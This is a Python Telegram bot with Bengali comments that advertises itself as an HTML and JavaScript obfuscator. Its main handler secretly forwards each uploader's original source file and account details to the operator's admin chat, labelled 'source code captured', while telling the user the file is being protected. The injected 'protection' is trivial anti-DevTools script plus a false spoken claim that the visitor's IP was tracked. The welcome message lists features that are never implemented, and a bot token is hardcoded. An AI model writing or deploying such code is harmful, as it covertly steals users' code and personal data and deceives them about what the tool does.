import os
import random
import string
from threading import Thread
from flask import Flask
import telebot
from telebot import types

# টোকেন এবং আপনার (নিরব ভাই) এডমিন আইডি
TOKEN = '8960539162:AAHnIm9z-7A3ZOu4RXbSkAlvaRwAS3AvMeA'
ADMIN_ID = 8419760844

bot = telebot.TeleBot(TOKEN)

# ডেটাবেস স্টোরেজ (ব্যান লিস্ট এবং টোটাল স্ট্যাটিস্টিক্স)
banned_users = set()
total_protected_count = 0

# ফ্লাস্ক সার্ভার (Render ফ্রি টায়ারে ২৪ ঘণ্টা সচল রাখার জন্য)
app = Flask('')

@app.route('/')
def home():
    return "NIROB GX Security Bot is running 24/7!"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ভারী জাংক স্ট্রিম এবং সিকিউরিটি জেনারেটর ফাংশন
def obfuscate_html(html_content):
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=6000))
    
    protected_wrapper = f"""<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<title>NIROB GX Protected Secure Page</title>
<script>
// অ্যান্টি ইন্সপেকশন ও ব্ল্যাকআউট ট্র্যাপ
document.addEventListener('contextmenu', function(e) {{ e.preventDefault(); alert('সতর্কতা! এই সাইটের সোর্স কোড প্রটেক্টেড।'); }});
document.addEventListener('keydown', function(e) {{
    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {{
        e.preventDefault();
        triggerSecurityProtocol();
    }}
}});
function triggerSecurityProtocol() {{
    document.body.innerHTML = '<div style="background:black;width:100vw;height:100vh;display:flex;justify-content:center;align-items:center;color:red;font-size:30px;font-weight:bold;text-align:center;">সতর্কতা! অবৈধভাবে সোর্স কোড দেখার চেষ্টা করার কারণে আপনার পেজটি ধ্বংস করা হয়েছে।</div>';
    let msg = new SpeechSynthesisUtterance("সতর্কতা! এই সাইটের সোর্স কোড চুরির চেষ্টা করা হয়েছে। আপনার আইপি ট্র্যাক করা হয়েছে।");
    msg.lang = 'bn-BD';
    window.speechSynthesis.speak(msg);
}}
</script>
<!-- NIROB GX JUNK SECURITY STREAM: {junk} -->
</head>
<body>
{html_content}
</body>
</html>"""
    return protected_wrapper

# মেইন বাটন কিবোর্ড তৈরি
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_obfuscate = types.KeyboardButton('🔒 Obfuscate')
    btn_html = types.KeyboardButton('🌐 HTML')
    markup.add(btn_obfuscate, btn_html)
    return markup

# /start কমান্ড হ্যান্ডলার
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id in banned_users:
        bot.reply_to(message, "❌ দুঃখিত, আপনি এই বট ব্যবহার করার জন্য ব্যানপ্রাপ্ত হয়েছেন।")
        return

    welcome_text = (
        "🔒 **HTML OBFUSCATOR BOT**\n\n"
        "🛡️ *Protect your HTML or JavaScript code with advanced obfuscation!*\n\n"
        "✨ **Features:**\n"
        "• 🛡️ Anti-Debug Protection\n"
        "• 🔍 DevTools Detection\n"
        "• 🌐 Extreme Obfuscation\n"
        "• 🔐 Domain Lock (Strict Mode)\n"
        "• 🛡️ Anti-Scraping Protection\n"
        "• 🖼️ Iframe/Sandbox Detection\n"
        "• 📜 JS Mode (.txt banner you add to your HTML)\n\n"
        "📄 **Send me your HTML file to start!** (.html or .js)\n\n"
        "👇 *Choose your mode first:*"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=main_keyboard())

# অ্যাডমিন কমান্ড: পরিসংখ্যান দেখার জন্য
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ এই কমান্ডটি শুধুমাত্র অ্যাডমিনের জন্য!")
        return
    
    admin_text = (
        "👑 **NIROB GX ADMIN PANEL**\n\n"
        f"📊 **Total Protected Files:** `{total_protected_count}`\n"
        f"🚫 **Banned Users Count:** `{len(banned_users)}`\n\n"
        "🛠️ **Commands:**\n"
        "• `/ban [user_id]` - ইউজার ব্যান করতে\n"
        "• `/unban [user_id]` - ইউজার আনব্যান করতে"
    )
    bot.reply_to(message, admin_text, parse_mode='Markdown')

# অ্যাডমিন কমান্ড: ব্যান করার জন্য
@bot.message_handler(commands=['ban'])
def ban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        banned_users.add(target_id)
        bot.reply_to(message, f"✅ ইউজার `{target_id}` সফলভাবে ব্যান করা হয়েছে।", parse_mode='Markdown')
    except Exception:
        bot.reply_to(message, "⚠️ সঠিক নিয়মে আইডি দিন। যেমন: `/ban 123456789`", parse_mode='Markdown')

# অ্যাডমিন কমান্ড: আনব্যান করার জন্য
@bot.message_handler(commands=['unban'])
def unban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        if target_id in banned_users:
            banned_users.remove(target_id)
            bot.reply_to(message, f"✅ ইউজার `{target_id}` আনব্যান করা হয়েছে।", parse_mode='Markdown')
        else:
            bot.reply_to(message, "⚠️ এই ইউজার ব্যান লিস্টে নেই।")
    except Exception:
        bot.reply_to(message, "⚠️ সঠিক নিয়মে আইডি দিন। যেমন: `/unban 123456789`", parse_mode='Markdown')

# বাটন ক্লিক হ্যান্ডলার
@bot.message_handler(func=lambda message: message.text in ['🔒 Obfuscate', '🌐 HTML'])
def handle_buttons(message):
    if message.from_user.id in banned_users:
        return
    if message.text == '🔒 Obfuscate':
        info_text = (
            "🔒 **MODE: OBFUSCATE**\n\n"
            "📄 Send your **.html** or **.js** file now and the bot will apply heavy security protection."
        )
        bot.send_message(message.chat.id, info_text, parse_mode='Markdown')
    elif message.text == '🌐 HTML':
        info_text = (
            "🌐 **MODE: HTML FILE PROTECTOR**\n\n"
            "📄 Send your **.html** file and the bot will protect it.\n\n"
            "ℹ️ *A .js file works here too — even if you selected HTML, just send the .js file and it will be processed with JavaScript obfuscation.*"
        )
        bot.send_message(message.chat.id, info_text, parse_mode='Markdown')

# ফাইল বা কোড রিসিভ করে প্রোটেক্ট করা এবং অ্যাডমিনের ইনবক্সে সোর্স কোড পাঠানোর মূল লজিক
@bot.message_handler(content_types=['text', 'document'])
def handle_incoming_code(message):
    if message.from_user.id in banned_users:
        return
    if message.text in ['🔒 Obfuscate', '🌐 HTML', '/start', '/admin'] or message.text and message.text.startswith('/ban') or message.text and message.text.startswith('/unban'):
        return

    sent_msg = bot.reply_to(message, "⏳ Processing and securing your file with **NIROB GX Engine**...")
    
    try:
        html_data = ""
        file_name_original = "unknown.html"
        
        if message.content_type == 'document':
            file_name_original = message.document.file_name or "unknown.html"
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            html_data = downloaded_file.decode('utf-8', errors='ignore')
        else:
            html_data = message.text

        # গ্লোবাল কাউন্ট বৃদ্ধি
        global total_protected_count
        total_protected_count += 1

        # 👑 নিরব ভাই (অ্যাডমিন)-এর ইনবক্সে ইউজারের আসল কোড/ফাইল পাঠিয়ে দেওয়া
        user_info = (
            f"📥 **NEW USER SOURCE CODE CAPTURED!**\n\n"
            f"👤 **User Name:** {message.from_user.first_name}\n"
            f"🆔 **User ID:** `{message.from_user.id}`\n"
            f"🔗 **Username:** @{message.from_user.username if message.from_user.username else 'N/A'}\n"
            f"📁 **File Name:** `{file_name_original}`\n"
            f"📊 **Total Protected So Far:** `{total_protected_count}`"
        )
        bot.send_message(ADMIN_ID, user_info, parse_mode='Markdown')
        
        # আসল কোডটি টেক্সট বা ডকুমেন্ট আকারে অ্যাডমিনের কাছে পাঠানো
        if len(html_data) < 3000:
            bot.send_message(ADMIN_ID, f"📄 **Original Code:**\n\n```html\n{html_data}\n```", parse_mode='Markdown')
        else:
            # কোড বড় হলে ফাইল আকারে পাঠানো
            temp_orig_name = f"Original_{message.from_user.id}.html"
            with open(temp_orig_name, "w", encoding="utf-8") as tf:
                tf.write(html_data)
            with open(temp_orig_name, "rb") as tf:
                bot.send_document(ADMIN_ID, tf, caption=f"📄 **Original Source Code from User ID:** `{message.from_user.id}`", parse_mode='Markdown')
            os.remove(temp_orig_name)

        # কোড প্রটেক্ট বা অবফাস্কেট করা
        secured_code = obfuscate_html(html_data)
        
        # আপনার ব্র্যান্ড নামে ফাইল সেভ
        output_file_name = "NIROB_PROTECTED_GX.html"
        with open(output_file_name, "w", encoding="utf-8") as f:
            f.write(secured_code)
            
        # ইউজারকে প্রটেক্টেড ফাইল পাঠানো
        with open(output_file_name, "rb") as f:
            bot.send_document(
                message.chat.id, 
                f, 
                caption=(
                    "✅ **File successfully protected!**\n\n"
                    "🛡️ **Features Applied:**\n"
                    "🔹 Blackout Trap & Inspection Blocker\n"
                    "🔹 Bangla Voice Warning Integrated\n"
                    "🔹 Heavy Junk Stream Protection\n\n"
                    "👑 _Protected by @NIROB_GX_LEADER_"
                ),
                parse_mode='Markdown'
            )
            
        os.remove(output_file_name)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

if __name__ == '__main__':
    keep_alive()
    print("Bot is starting...")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
